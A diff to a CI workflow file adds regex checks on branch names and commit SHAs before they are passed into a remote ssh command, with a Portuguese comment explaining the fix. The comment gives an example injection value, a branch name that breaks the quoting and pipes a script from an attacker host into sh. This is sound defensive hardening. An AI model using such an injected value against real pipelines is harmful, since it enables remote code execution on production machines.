@@ -119,6 +119,24 @@ jobs:
               continue
             fi
 
+            # Rodada 2 (2026-08-18): head_ref e head_sha sao interpolados numa string
+            # de comando remoto (ssh "... '${head_ref}' ..."). As aspas simples so
+            # protegem enquanto o valor nao contiver uma aspa simples -- e nomes de
+            # branch do Git PODEM conter aspa simples. Sem esta checagem, uma branch
+            # chamada por exemplo x'; curl attacker/s | sh; ' resultaria em execucao
+            # remota de codigo na VM de producao como usuario ubuntu. O repo tem
+            # multiplos agentes autonomos criando branches, entao o vetor nao e so
+            # hipotetico. Nomes de branch e SHAs legitimos sempre casam com os regex
+            # abaixo, entao isto nao afeta o fluxo normal.
+            if [[ ! "$head_ref" =~ ^[A-Za-z0-9._/-]+$ ]]; then
+              echo "pr_${pr}_skipped_unsafe_ref=true"
+              continue
+            fi
+            if [[ ! "$head_sha" =~ ^[0-9a-f]{40}$ ]]; then
+              echo "pr_${pr}_skipped_unsafe_sha=true"
+              continue
+            fi
+
             ssh -o BatchMode=yes -o StrictHostKeyChecking=yes \
               -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
               "${VM_USER}@${VM_HOST}" \
